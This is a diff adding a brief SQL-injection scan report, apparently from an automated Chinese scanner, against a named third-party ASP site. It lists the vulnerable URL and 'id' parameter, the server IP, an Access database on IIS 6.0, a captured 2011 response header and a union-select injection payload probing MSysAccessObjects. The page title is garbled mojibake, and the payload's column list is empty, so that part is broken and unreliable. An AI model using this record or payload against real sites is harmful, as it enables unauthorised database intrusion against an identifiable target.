@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://www.whchangxing.com/kr/view.asp?id=13
+ ·页面标题：Weihai绰 坷阀悼救 措吝利 蜡茄 氓烙 雀荤甫 俺祈窍绰 狼幅 捞促 -- Weihai 狼幅 技殴 傍厘
+
+ ·参数:id=13
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.155.154.176
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:56:53 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 1950
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQCQQTSDD=LHOPMHEABFHLFODAEECKBNPG; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
